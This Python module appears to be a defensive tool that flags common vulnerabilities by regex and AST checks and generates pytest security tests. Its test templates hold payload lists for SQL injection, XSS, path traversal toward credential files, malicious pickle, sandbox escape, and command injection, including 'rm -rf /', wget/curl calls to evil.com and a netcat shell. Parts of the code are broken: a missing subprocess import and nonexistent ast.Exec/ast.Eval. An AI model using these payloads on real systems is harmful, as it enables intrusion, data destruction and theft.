"""
Automatic security test generation for input validation, injection attacks, etc.
"""

import ast
import re
from typing import Dict, List, Any, Optional, Set, Tuple
from dataclasses import dataclass


@dataclass
class SecurityVulnerability:
    """Represents a potential security vulnerability."""
    vulnerability_type: str
    severity: str  # 'low', 'medium', 'high', 'critical'
    description: str
    affected_function: str
    line_number: int
    mitigation: str


@dataclass
class SecurityTest:
    """Generated security test."""
    test_name: str
    test_description: str
    test_code: str
    vulnerability_type: str
    severity: str


class SecurityAnalyzer:
    """Analyzes code to identify potential security vulnerabilities."""

    def __init__(self):
        self.vulnerability_patterns = {
            'sql_injection': {
                'patterns': [r'execute\s*\(\s*["\'].*%s.*["\']', r'cursor\.execute\s*\(.*%s'],
                'severity': 'high',
                'description': 'SQL injection vulnerability detected'
            },
            'xss': {
                'patterns': [r'response\.write\s*\(.*request\.', r'print\s*\(.*request\.'],
                'severity': 'medium',
                'description': 'Cross-site scripting vulnerability detected'
            },
            'path_traversal': {
                'patterns': [r'open\s*\(.*request\.', r'file\s*\(.*request\.'],
                'severity': 'high',
                'description': 'Path traversal vulnerability detected'
            },
            'command_injection': {
                'patterns': [r'os\.system\s*\(.*request\.', r'subprocess\.run\s*\(.*request\.'],
                'severity': 'critical',
                'description': 'Command injection vulnerability detected'
            },
            'unsafe_deserialization': {
                'patterns': [r'pickle\.loads?\s*\(', r'json\.loads?\s*\(.*request\.'],
                'severity': 'high',
                'description': 'Unsafe deserialization vulnerability detected'
            },
            'weak_crypto': {
                'patterns': [r'md5\s*\(', r'sha1\s*\(', r'DES\s*\(', r'RC4\s*\('],
                'severity': 'medium',
                'description': 'Weak cryptographic algorithm detected'
            },
            'hardcoded_secrets': {
                'patterns': [r'password\s*=\s*["\'][^"\']+["\']', r'api_key\s*=\s*["\'][^"\']+["\']'],
                'severity': 'high',
                'description': 'Hardcoded secret detected'
            },
            'missing_input_validation': {
                'patterns': [r'def\s+\w+.*request\.', r'def\s+\w+.*args\.'],
                'severity': 'medium',
                'description': 'Missing input validation'
            }
        }

    def analyze_function_security(self, func_ast: ast.FunctionDef) -> List[SecurityVulnerability]:
        """Analyze a function for security vulnerabilities."""
        vulnerabilities = []
        
        # Get function source code
        function_name = func_ast.name
        line_number = func_ast.lineno
        
        # Convert AST back to source code for pattern matching
        try:
            import astor
            source_code = astor.to_source(func_ast)
        except ImportError:
            # Fallback: basic source reconstruction
            source_code = self._reconstruct_source(func_ast)
        
        # Check for vulnerability patterns
        for vuln_type, vuln_info in self.vulnerability_patterns.items():
            for pattern in vuln_info['patterns']:
                if re.search(pattern, source_code, re.IGNORECASE):
                    vulnerability = SecurityVulnerability(
                        vulnerability_type=vuln_type,
                        severity=vuln_info['severity'],
                        description=vuln_info['description'],
                        affected_function=function_name,
                        line_number=line_number,
                        mitigation=self._get_mitigation(vuln_type)
                    )
                    vulnerabilities.append(vulnerability)
        
        # Check for specific security anti-patterns
        vulnerabilities.extend(self._check_security_anti_patterns(func_ast, function_name))
        
        return vulnerabilities

    def _reconstruct_source(self, func_ast: ast.FunctionDef) -> str:
        """Basic source reconstruction for pattern matching."""
        # This is a simplified reconstruction
        # In practice, you'd use astor or similar library
        return f"def {func_ast.name}():\n    pass"

    def _check_security_anti_patterns(self, func_ast: ast.FunctionDef, function_name: str) -> List[SecurityVulnerability]:
        """Check for security anti-patterns in function AST."""
        vulnerabilities = []
        
        for node in ast.walk(func_ast):
            # Check for dangerous function calls
            if isinstance(node, ast.Call):
                if isinstance(node.func, ast.Name):
                    func_name = node.func.id
                    
                    # Check for dangerous functions
                    if func_name in ['eval', 'exec', 'compile']:
                        vulnerabilities.append(SecurityVulnerability(
                            vulnerability_type='code_injection',
                            severity='critical',
                            description=f'Dangerous function {func_name} used',
                            affected_function=function_name,
                            line_number=getattr(node, 'lineno', 0),
                            mitigation='Avoid using eval, exec, or compile with user input'
                        ))
                    
                    elif func_name in ['os.system', 'subprocess.run', 'subprocess.call']:
                        vulnerabilities.append(SecurityVulnerability(
                            vulnerability_type='command_injection',
                            severity='critical',
                            description=f'System command execution detected: {func_name}',
                            affected_function=function_name,
                            line_number=getattr(node, 'lineno', 0),
                            mitigation='Use subprocess with shell=False and validate inputs'
                        ))
                    
                    elif func_name in ['pickle.loads', 'pickle.load']:
                        vulnerabilities.append(SecurityVulnerability(
                            vulnerability_type='unsafe_deserialization',
                            severity='high',
                            description='Unsafe pickle deserialization detected',
                            affected_function=function_name,
                            line_number=getattr(node, 'lineno', 0),
                            mitigation='Use safe serialization formats like JSON'
                        ))
        
        return vulnerabilities

    def _get_mitigation(self, vulnerability_type: str) -> str:
        """Get mitigation advice for vulnerability type."""
        mitigations = {
            'sql_injection': 'Use parameterized queries or ORM',
            'xss': 'Escape output and use Content Security Policy',
            'path_traversal': 'Validate and sanitize file paths',
            'command_injection': 'Use subprocess with shell=False and validate inputs',
            'unsafe_deserialization': 'Use safe serialization formats like JSON',
            'weak_crypto': 'Use strong cryptographic algorithms like SHA-256, AES-256',
            'hardcoded_secrets': 'Use environment variables or secure secret management',
            'missing_input_validation': 'Add input validation and sanitization',
            'code_injection': 'Avoid using eval, exec, or compile with user input'
        }
        return mitigations.get(vulnerability_type, 'Review and secure this code')

    def analyze_file_security(self, file_path: str) -> List[SecurityVulnerability]:
        """Analyze a file for security vulnerabilities."""
        vulnerabilities = []
        
        try:
            with open(file_path, 'r') as f:
                content = f.read()
            
            tree = ast.parse(content)
            
            for node in ast.walk(tree):
                if isinstance(node, ast.FunctionDef):
                    func_vulnerabilities = self.analyze_function_security(node)
                    vulnerabilities.extend(func_vulnerabilities)
        
        except Exception:
            pass
        
        return vulnerabilities


class SecurityTestGenerator:
    """Generates security tests based on identified vulnerabilities."""

    def __init__(self):
        self.test_templates = {
            'sql_injection': self._generate_sql_injection_tests,
            'xss': self._generate_xss_tests,
            'path_traversal': self._generate_path_traversal_tests,
            'command_injection': self._generate_command_injection_tests,
            'unsafe_deserialization': self._generate_deserialization_tests,
            'weak_crypto': self._generate_crypto_tests,
            'hardcoded_secrets': self._generate_secret_tests,
            'missing_input_validation': self._generate_input_validation_tests,
            'code_injection': self._generate_code_injection_tests
        }

    def generate_security_tests(self, vulnerabilities: List[SecurityVulnerability], 
                              source_file: str) -> List[SecurityTest]:
        """Generate security tests for identified vulnerabilities."""
        tests = []
        
        # Group vulnerabilities by type
        vuln_by_type = {}
        for vuln in vulnerabilities:
            if vuln.vulnerability_type not in vuln_by_type:
                vuln_by_type[vuln.vulnerability_type] = []
            vuln_by_type[vuln.vulnerability_type].append(vuln)
        
        # Generate tests for each vulnerability type
        for vuln_type, vulns in vuln_by_type.items():
            if vuln_type in self.test_templates:
                test = self.test_templates[vuln_type](vulns[0], source_file)
                if test:
                    tests.append(test)
        
        return tests

    def _generate_sql_injection_tests(self, vulnerability: SecurityVulnerability, source_file: str) -> SecurityTest:
        """Generate SQL injection tests."""
        test_name = f"test_{vulnerability.affected_function}_sql_injection_protection"
        test_description = f"Test SQL injection protection for {vulnerability.affected_function}"
        
        test_code = f'''
def {test_name}():
    """{test_description}."""
    import pytest
    from unittest.mock import patch, MagicMock
    
    # Import the function under test
    from {source_file.replace('.py', '').replace('/', '.')} import {vulnerability.affected_function}
    
    # SQL injection payloads
    malicious_inputs = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; INSERT INTO users (username, password) VALUES ('hacker', 'password'); --",
        "1' UNION SELECT password FROM users WHERE '1'='1",
        "admin'--",
        "admin'/*",
        "' OR 1=1#",
        "'; EXEC xp_cmdshell('dir'); --"
    ]
    
    for malicious_input in malicious_inputs:
        with pytest.raises((ValueError, TypeError, AttributeError)):
            # Test that function properly handles malicious input
            {vulnerability.affected_function}(malicious_input)
    
    # Test with valid input to ensure function still works
    try:
        result = {vulnerability.affected_function}("valid_input")
        # Function should work with valid input
        assert result is not None
    except Exception as e:
        # If function requires specific valid input, that's acceptable
        pass

def test_{vulnerability.affected_function}_sql_parameterized_queries():
    """Test that {vulnerability.affected_function} uses parameterized queries."""
    import pytest
    
    from {source_file.replace('.py', '').replace('/', '.')} import {vulnerability.affected_function}
    
    # Test with SQL injection payload that should be treated as literal string
    malicious_input = "'; DROP TABLE users; --"
    
    # This should not cause database damage if parameterized queries are used
    try:
        result = {vulnerability.affected_function}(malicious_input)
        # If function returns without error, verify the input was treated as literal
        assert malicious_input not in str(result) or 'DROP' not in str(result)
    except Exception:
        # Function should fail safely, not execute the malicious SQL
        pass
'''
        
        return SecurityTest(
            test_name=test_name,
            test_description=test_description,
            test_code=test_code,
            vulnerability_type='sql_injection',
            severity='high'
        )

    def _generate_xss_tests(self, vulnerability: SecurityVulnerability, source_file: str) -> SecurityTest:
        """Generate XSS tests."""
        test_name = f"test_{vulnerability.affected_function}_xss_protection"
        test_description = f"Test XSS protection for {vulnerability.affected_function}"
        
        test_code = f'''
def {test_name}():
    """{test_description}."""
    import pytest
    import html
    
    from {source_file.replace('.py', '').replace('/', '.')} import {vulnerability.affected_function}
    
    # XSS payloads
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "';alert('XSS');//",
        "<iframe src='javascript:alert(\\'XSS\\')'></iframe>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>"
    ]
    
    for payload in xss_payloads:
        try:
            result = {vulnerability.affected_function}(payload)
            
            # Check that output is properly escaped
            if isinstance(result, str):
                assert "<script>" not in result.lower()
                assert "javascript:" not in result.lower()
                assert "onerror=" not in result.lower()
                assert "onload=" not in result.lower()
                assert "onfocus=" not in result.lower()
                
                # Check that HTML entities are escaped
                if payload in result:
                    assert result.count('&lt;') > 0 or result.count('&gt;') > 0
        except Exception:
            # Function should handle malicious input gracefully
            pass

def test_{vulnerability.affected_function}_output_encoding():
    """Test that {vulnerability.affected_function} properly encodes output."""
    import pytest
    import html
    
    from {source_file.replace('.py', '').replace('/', '.')} import {vulnerability.affected_function}
    
    test_input = "<script>alert('test')</script>"
    
    try:
        result = {vulnerability.affected_function}(test_input)
        
        if isinstance(result, str):
            # Check that dangerous characters are encoded
            assert "&lt;" in result or "&#60;" in result
            assert "&gt;" in result or "&#62;" in result
            assert "&amp;" in result or "&#38;" in result
    except Exception:
        pass
'''
        
        return SecurityTest(
            test_name=test_name,
            test_description=test_description,
            test_code=test_code,
            vulnerability_type='xss',
            severity='medium'
        )

    def _generate_input_validation_tests(self, vulnerability: SecurityVulnerability, source_file: str) -> SecurityTest:
        """Generate input validation tests."""
        test_name = f"test_{vulnerability.affected_function}_input_validation"
        test_description = f"Test input validation for {vulnerability.affected_function}"
        
        test_code = f'''
def {test_name}():
    """{test_description}."""
    import pytest
    
    from {source_file.replace('.py', '').replace('/', '.')} import {vulnerability.affected_function}
    
    # Invalid input types
    invalid_inputs = [
        None,
        "",
        " ",
        "   ",
        "\\n\\t\\r",
        "a" * 1000,  # Very long string
        [],  # Empty list
        {{}},  # Empty dict
        object(),  # Invalid object
        "test@",  # Invalid email format
        "123.456.789.012",  # Invalid IP
        "file:///etc/passwd",  # File URL
        "javascript:alert(1)",  # JavaScript URL
    ]
    
    for invalid_input in invalid_inputs:
        with pytest.raises((ValueError, TypeError, AttributeError)):
            {vulnerability.affected_function}(invalid_input)

def test_{vulnerability.affected_function}_boundary_validation():
    """Test boundary validation for {vulnerability.affected_function}."""
    import pytest
    
    from {source_file.replace('.py', '').replace('/', '.')} import {vulnerability.affected_function}
    
    # Test boundary conditions
    boundary_tests = [
        -1,  # Negative number
        0,   # Zero
        999999999,  # Very large number
        float('inf'),  # Infinity
        float('-inf'),  # Negative infinity
        float('nan'),  # Not a number
    ]
    
    for boundary_input in boundary_tests:
        with pytest.raises((ValueError, TypeError, OverflowError)):
            {vulnerability.affected_function}(boundary_input)

def test_{vulnerability.affected_function}_special_characters():
    """Test special character handling for {vulnerability.affected_function}."""
    import pytest
    
    from {source_file.replace('.py', '').replace('/', '.')} import {vulnerability.affected_function}
    
    # Special characters that might cause issues
    special_chars = [
        "!@#$%^&*()",
        "[]{{}}|\\:;\"'<>?/",
        "\\x00\\x01\\x02",  # Null bytes
        "\\u0000\\u0001",  # Unicode nulls
        "\\r\\n\\t\\f\\v",  # Control characters
    ]
    
    for special_input in special_chars:
        with pytest.raises((ValueError, TypeError)):
            {vulnerability.affected_function}(special_input)
'''
        
        return SecurityTest(
            test_name=test_name,
            test_description=test_description,
            test_code=test_code,
            vulnerability_type='missing_input_validation',
            severity='medium'
        )

    def _generate_path_traversal_tests(self, vulnerability: SecurityVulnerability, source_file: str) -> SecurityTest:
        """Generate path traversal tests."""
        test_name = f"test_{vulnerability.affected_function}_path_traversal_protection"
        test_description = f"Test path traversal protection for {vulnerability.affected_function}"
        
        test_code = f'''
def {test_name}():
    """{test_description}."""
    import pytest
    import os
    
    from {source_file.replace('.py', '').replace('/', '.')} import {vulnerability.affected_function}
    
    # Path traversal payloads
    traversal_payloads = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "/etc/passwd",
        "C:\\\\windows\\\\system32\\\\config\\\\sam",
        "//etc//passwd",
        "\\\\server\\\\share\\\\file.txt"
    ]
    
    for payload in traversal_payloads:
        with pytest.raises((ValueError, PermissionError, FileNotFoundError)):
            {vulnerability.affected_function}(payload)

def test_{vulnerability.affected_function}_safe_path_validation():
    """Test safe path validation for {vulnerability.affected_function}."""
    import pytest
    
    from {source_file.replace('.py', '').replace('/', '.')} import {vulnerability.affected_function}
    
    # Test that function validates paths are within allowed directory
    malicious_paths = [
        "/etc/passwd",
        "/root/.ssh/id_rsa",
        "C:\\\\windows\\\\system32\\\\config\\\\sam",
        "/proc/self/environ",
        "/var/log/auth.log"
    ]
    
    for malicious_path in malicious_paths:
        with pytest.raises((ValueError, PermissionError)):
            {vulnerability.affected_function}(malicious_path)
'''
        
        return SecurityTest(
            test_name=test_name,
            test_description=test_description,
            test_code=test_code,
            vulnerability_type='path_traversal',
            severity='high'
        )

    def _generate_command_injection_tests(self, vulnerability: SecurityVulnerability, source_file: str) -> SecurityTest:
        """Generate command injection tests."""
        test_name = f"test_{vulnerability.affected_function}_command_injection_protection"
        test_description = f"Test command injection protection for {vulnerability.affected_function}"
        
        test_code = f'''
def {test_name}():
    """{test_description}."""
    import pytest
    
    from {source_file.replace('.py', '').replace('/', '.')} import {vulnerability.affected_function}
    
    # Command injection payloads
    injection_payloads = [
        "; rm -rf /",
        "| cat /etc/passwd",
        "&& whoami",
        "`id`",
        "$(whoami)",
        "; ls -la",
        "| wget http://evil.com/malware",
        "&& curl http://evil.com/steal",
        "; nc -l -p 4444 -e /bin/sh",
        "| python -c 'import os; os.system(\\'id\\')'"
    ]
    
    for payload in injection_payloads:
        with pytest.raises((ValueError, TypeError, subprocess.SubprocessError)):
            {vulnerability.affected_function}(payload)

def test_{vulnerability.affected_function}_subprocess_safety():
    """Test subprocess safety for {vulnerability.affected_function}."""
    import pytest
    import subprocess
    
    from {source_file.replace('.py', '').replace('/', '.')} import {vulnerability.affected_function}
    
    # Test that function doesn't execute arbitrary commands
    dangerous_inputs = [
        "rm -rf /",
        "format c:",
        "del /s /q *",
        "shutdown -s -t 0",
        "halt",
        "reboot"
    ]
    
    for dangerous_input in dangerous_inputs:
        with pytest.raises((ValueError, subprocess.SubprocessError)):
            {vulnerability.affected_function}(dangerous_input)
'''
        
        return SecurityTest(
            test_name=test_name,
            test_description=test_description,
            test_code=test_code,
            vulnerability_type='command_injection',
            severity='critical'
        )

    def _generate_deserialization_tests(self, vulnerability: SecurityVulnerability, source_file: str) -> SecurityTest:
        """Generate unsafe deserialization tests."""
        test_name = f"test_{vulnerability.affected_function}_deserialization_safety"
        test_description = f"Test deserialization safety for {vulnerability.affected_function}"
        
        test_code = f'''
def {test_name}():
    """{test_description}."""
    import pytest
    import pickle
    
    from {source_file.replace('.py', '').replace('/', '.')} import {vulnerability.affected_function}
    
    # Malicious pickle payload
    class MaliciousPayload:
        def __reduce__(self):
            import os
            return (os.system, ('echo "PWNED"',))
    
    malicious_data = pickle.dumps(MaliciousPayload())
    
    with pytest.raises((ValueError, TypeError, pickle.UnpicklingError)):
        {vulnerability.affected_function}(malicious_data)

def test_{vulnerability.affected_function}_json_safety():
    """Test JSON deserialization safety for {vulnerability.affected_function}."""
    import pytest
    import json
    
    from {source_file.replace('.py', '').replace('/', '.')} import {vulnerability.affected_function}
    
    # Test with valid JSON
    valid_json = json.dumps({{"key": "value"}})
    
    try:
        result = {vulnerability.affected_function}(valid_json)
        assert result is not None
    except Exception:
        pass
    
    # Test with malicious JSON structure
    malicious_json = json.dumps({{
        "__reduce__": "os.system",
        "args": ["echo 'PWNED'"]
    }})
    
    # Should not execute arbitrary code
    with pytest.raises((ValueError, TypeError)):
        {vulnerability.affected_function}(malicious_json)
'''
        
        return SecurityTest(
            test_name=test_name,
            test_description=test_description,
            test_code=test_code,
            vulnerability_type='unsafe_deserialization',
            severity='high'
        )

    def _generate_crypto_tests(self, vulnerability: SecurityVulnerability, source_file: str) -> SecurityTest:
        """Generate weak cryptography tests."""
        test_name = f"test_{vulnerability.affected_function}_crypto_strength"
        test_description = f"Test cryptographic strength for {vulnerability.affected_function}"
        
        test_code = f'''
def {test_name}():
    """{test_description}."""
    import pytest
    
    from {source_file.replace('.py', '').replace('/', '.')} import {vulnerability.affected_function}
    
    # Test that function doesn't use weak algorithms
    test_input = "test_data"
    
    try:
        result = {vulnerability.affected_function}(test_input)
        
        # Check that result doesn't contain weak hash signatures
        if isinstance(result, str):
            # MD5 hashes are 32 characters
            # SHA-1 hashes are 40 characters
            # These are weak and should be avoided
            assert len(result) not in [32, 40] or "MD5" not in str(result).upper()
    except Exception:
        pass

def test_{vulnerability.affected_function}_hash_algorithm():
    """Test that {vulnerability.affected_function} uses strong hash algorithms."""
    import pytest
    import hashlib
    
    from {source_file.replace('.py', '').replace('/', '.')} import {vulnerability.affected_function}
    
    test_data = "test_input"
    
    try:
        result = {vulnerability.affected_function}(test_data)
        
        if isinstance(result, str) and len(result) >= 64:
            # SHA-256 or stronger (64+ characters)
            assert True
        elif isinstance(result, str):
            # Check that it's not a weak hash
            weak_hashes = [
                hashlib.md5(test_data.encode()).hexdigest(),
                hashlib.sha1(test_data.encode()).hexdigest()
            ]
            assert result not in weak_hashes
    except Exception:
        pass
'''
        
        return SecurityTest(
            test_name=test_name,
            test_description=test_description,
            test_code=test_code,
            vulnerability_type='weak_crypto',
            severity='medium'
        )

    def _generate_secret_tests(self, vulnerability: SecurityVulnerability, source_file: str) -> SecurityTest:
        """Generate hardcoded secret tests."""
        test_name = f"test_{vulnerability.affected_function}_no_hardcoded_secrets"
        test_description = f"Test for hardcoded secrets in {vulnerability.affected_function}"
        
        test_code = f'''
def {test_name}():
    """{test_description}."""
    import pytest
    import inspect
    
    from {source_file.replace('.py', '').replace('/', '.')} import {vulnerability.affected_function}
    
    # Get function source code
    try:
        source = inspect.getsource({vulnerability.affected_function})
        
        # Check for hardcoded secrets
        secret_patterns = [
            r'password\s*=\s*["\'][^"\']+["\']',
            r'api_key\s*=\s*["\'][^"\']+["\']',
            r'secret\s*=\s*["\'][^"\']+["\']',
            r'token\s*=\s*["\'][^"\']+["\']',
            r'private_key\s*=\s*["\'][^"\']+["\']',
        ]
        
        import re
        for pattern in secret_patterns:
            matches = re.findall(pattern, source, re.IGNORECASE)
            assert len(matches) == 0, f"Hardcoded secret found: {{matches}}"
    except Exception:
        # If we can't get source, that's acceptable
        pass

def test_{vulnerability.affected_function}_environment_variables():
    """Test that {vulnerability.affected_function} uses environment variables for secrets."""
    import pytest
    import os
    
    from {source_file.replace('.py', '').replace('/', '.')} import {vulnerability.affected_function}
    
    # Test that function works with environment variables
    test_env_vars = {{
        'API_KEY': 'test_key',
        'PASSWORD': 'test_password',
        'SECRET': 'test_secret'
    }}
    
    # Set environment variables
    for key, value in test_env_vars.items():
        os.environ[key] = value
    
    try:
        # Function should work with environment variables
        result = {vulnerability.affected_function}("test_input")
        assert result is not None
    except Exception:
        # If function requires specific configuration, that's acceptable
        pass
    finally:
        # Clean up environment variables
        for key in test_env_vars:
            os.environ.pop(key, None)
'''
        
        return SecurityTest(
            test_name=test_name,
            test_description=test_description,
            test_code=test_code,
            vulnerability_type='hardcoded_secrets',
            severity='high'
        )

    def _generate_code_injection_tests(self, vulnerability: SecurityVulnerability, source_file: str) -> SecurityTest:
        """Generate code injection tests."""
        test_name = f"test_{vulnerability.affected_function}_code_injection_protection"
        test_description = f"Test code injection protection for {vulnerability.affected_function}"
        
        test_code = f'''
def {test_name}():
    """{test_description}."""
    import pytest
    
    from {source_file.replace('.py', '').replace('/', '.')} import {vulnerability.affected_function}
    
    # Code injection payloads
    injection_payloads = [
        "__import__('os').system('id')",
        "exec('import os; os.system(\\'id\\')')",
        "eval('__import__(\\'os\\').system(\\'id\\')')",
        "compile('import os; os.system(\\'id\\')', '<string>', 'exec')",
        "__builtins__['__import__']('os').system('id')",
        "globals()['__builtins__']['__import__']('os').system('id')",
        "vars()['__import__']('os').system('id')",
        "dir()[0].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['sys'].modules['os'].system('id')"
    ]
    
    for payload in injection_payloads:
        with pytest.raises((ValueError, TypeError, SyntaxError, NameError)):
            {vulnerability.affected_function}(payload)

def test_{vulnerability.affected_function}_safe_evaluation():
    """Test safe evaluation for {vulnerability.affected_function}."""
    import pytest
    import ast
    
    from {source_file.replace('.py', '').replace('/', '.')} import {vulnerability.affected_function}
    
    # Test with safe expressions
    safe_expressions = [
        "1 + 1",
        "2 * 3",
        "len('test')",
        "[1, 2, 3]",
        "{{'key': 'value'}}"
    ]
    
    for expression in safe_expressions:
        try:
            # Parse to check if it's a safe expression
            tree = ast.parse(expression, mode='eval')
            
            # Check for dangerous nodes
            dangerous_nodes = [
                ast.Call,
                ast.Import,
                ast.ImportFrom,
                ast.Exec,
                ast.Eval
            ]
            
            for node in ast.walk(tree):
                if isinstance(node, tuple(dangerous_nodes)):
                    with pytest.raises((ValueError, TypeError)):
                        {vulnerability.affected_function}(expression)
                    break
            else:
                # Safe expression
                try:
                    result = {vulnerability.affected_function}(expression)
                    assert result is not None
                except Exception:
                    pass
        except SyntaxError:
            with pytest.raises((ValueError, TypeError, SyntaxError)):
                {vulnerability.affected_function}(expression)
'''
        
        return SecurityTest(
            test_name=test_name,
            test_description=test_description,
            test_code=test_code,
            vulnerability_type='code_injection',
            severity='critical'
        )


class AutoSecurityTesting:
    """Main class for automatic security test generation."""

    def __init__(self):
        self.analyzer = SecurityAnalyzer()
        self.generator = SecurityTestGenerator()

    def analyze_and_generate_tests(self, source_file: str) -> List[SecurityTest]:
        """Analyze source file and generate security tests."""
        # Analyze file for security vulnerabilities
        vulnerabilities = self.analyzer.analyze_file_security(source_file)
        
        if not vulnerabilities:
            return []
        
        # Generate security tests
        tests = self.generator.generate_security_tests(vulnerabilities, source_file)
        
        return tests

    def generate_security_report(self, tests: List[SecurityTest], vulnerabilities: List[SecurityVulnerability] = None) -> str:
        """Generate a comprehensive security report."""
        if not tests and not vulnerabilities:
            return "✅ No security tests needed - no security vulnerabilities found."
        
        report_lines = []
        report_lines.append("=" * 60)
        report_lines.append("🔒 AUTOMATIC SECURITY TEST GENERATION REPORT")
        report_lines.append("=" * 60)
        
        if vulnerabilities:
            report_lines.append(f"\n🚨 VULNERABILITIES FOUND: {len(vulnerabilities)}")
            
            # Group by severity
            critical_vulns = [v for v in vulnerabilities if v.severity == 'critical']
            high_vulns = [v for v in vulnerabilities if v.severity == 'high']
            medium_vulns = [v for v in vulnerabilities if v.severity == 'medium']
            low_vulns = [v for v in vulnerabilities if v.severity == 'low']
            
            if critical_vulns:
                report_lines.append(f"\n🔴 CRITICAL VULNERABILITIES ({len(critical_vulns)}):")
                for vuln in critical_vulns:
                    report_lines.append(f"  • {vuln.vulnerability_type}: {vuln.affected_function}")
                    report_lines.append(f"    {vuln.description}")
            
            if high_vulns:
                report_lines.append(f"\n🟠 HIGH SEVERITY VULNERABILITIES ({len(high_vulns)}):")
                for vuln in high_vulns:
                    report_lines.append(f"  • {vuln.vulnerability_type}: {vuln.affected_function}")
                    report_lines.append(f"    {vuln.description}")
            
            if medium_vulns:
                report_lines.append(f"\n🟡 MEDIUM SEVERITY VULNERABILITIES ({len(medium_vulns)}):")
                for vuln in medium_vulns:
                    report_lines.append(f"  • {vuln.vulnerability_type}: {vuln.affected_function}")
                    report_lines.append(f"    {vuln.description}")
        
        if tests:
            report_lines.append(f"\n🧪 SECURITY TESTS GENERATED: {len(tests)}")
            
            # Group tests by vulnerability type
            test_by_type = {}
            for test in tests:
                if test.vulnerability_type not in test_by_type:
                    test_by_type[test.vulnerability_type] = []
                test_by_type[test.vulnerability_type].append(test)
            
            for vuln_type, type_tests in test_by_type.items():
                report_lines.append(f"\n🔒 {vuln_type.upper()} TESTS ({len(type_tests)}):")
                for test in type_tests:
                    report_lines.append(f"  • {test.test_name}")
                    report_lines.append(f"    Severity: {test.severity}")
        
        report_lines.append(f"\n💡 SECURITY RECOMMENDATIONS:")
        report_lines.append(f"  • Run security tests regularly in CI/CD pipeline")
        report_lines.append(f"  • Implement input validation and sanitization")
        report_lines.append(f"  • Use parameterized queries for database operations")
        report_lines.append(f"  • Escape output to prevent XSS attacks")
        report_lines.append(f"  • Use environment variables for secrets")
        report_lines.append(f"  • Implement proper authentication and authorization")
        report_lines.append(f"  • Keep dependencies updated and scan for vulnerabilities")
        
        return "\n".join(report_lines)
